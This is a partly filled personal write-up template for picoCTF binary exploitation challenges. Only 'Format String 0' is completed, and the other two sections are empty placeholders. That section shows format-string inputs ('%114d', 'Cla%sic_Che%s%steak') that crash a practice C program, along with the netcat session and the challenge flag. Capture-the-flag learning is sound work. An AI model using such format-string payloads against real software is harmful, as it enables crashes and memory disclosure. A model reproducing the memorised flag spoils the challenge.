# 1. Buffer Overflow 0
> Put in the challenge's description here

## Solution:

- Include as many steps as you can with your thought process
- You **must** include images such as screenshots wherever relevant.

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{}
```

## Concepts learnt:

- Include the new topics you've come across and explain them in brief
- 

## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- 

## Resources:

- Include the resources you've referred to with links. [example hyperlink](https://google.com)

<br><br><br>
***
<br><br><br>


# 2. Format String 0

> Can you use your knowledge of format strings to make the customers happy? Download the binary here. Download the source here. Connect with the challenge instance here: nc mimas.picoctf.net 59043

## Solution:

- Probably the easiest challenge till now. For the first choice, %114d is a valid format specifier in C. After examining the code, I found out that I just needed the string length to exceed 64. `%114d` fill in any garbage value of 114 digits in length. For the second choice, the text talks about _breaking_ the shop. `Cla%sic_Che%s%steak` will break the program as there are no values passed to it in the printf statement.

```
sid@sidsAsusZenbook:~/cryptoTP$ nc mimas.picoctf.net 62362
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}

```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

## Concepts learnt:

- Format specifiers in C

## Notes:

- This could've been solved by a simply hit and trial as well.
- I don't understand why the binary for the code was provided.

## Resources:
- [This](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) was provided in the PDF and helped me to understand what the challenge could be about.

  
<br><br><br>
***
<br><br><br>


# 3. Clutter Over-flow

> Put in the challenge's description here

## Solution:

- Include as many steps as you can with your thought process
- You **must** include images such as screenshots wherever relevant.

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{}
```

## Concepts learnt:

- Include the new topics you've come across and explain them in brief
- 

## Notes:

- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
- 

## Resources:

- Include the resources you've referred to with links. [example hyperlink](https://google.com)
- 

